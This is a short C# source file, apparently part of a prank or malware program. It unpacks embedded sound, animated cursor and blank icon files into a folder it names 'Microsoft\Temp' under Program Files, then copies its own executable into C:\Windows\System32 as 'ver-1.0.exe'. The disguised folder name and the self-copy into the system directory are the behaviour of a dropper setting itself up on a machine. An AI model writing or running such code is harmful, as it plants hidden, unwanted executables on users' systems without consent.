using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace version1
{
    public class Main_handler
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public void Main_hand()
        {
            string[] res_files = { "noise2.wav", "ab_g.ani", "al_g.ani", "ar_g.ani", "aw_g.ani", "blank.ico" }; 
            string file_path = @"C:\Program Files (x86)\Microsoft\Temp\";
            string system_path = @"C:\Windows\System32\";
            while (!Directory.Exists(file_path))
                Directory.CreateDirectory(file_path);
            for (int num = 0; num < res_files.Length; num++)
                Extract("version1", @"C:\Program Files (x86)\Microsoft\Temp", "Resources", res_files[num]);
            File.Copy(Application.ExecutablePath, system_path + "ver-1.0.exe");
        }
    }
}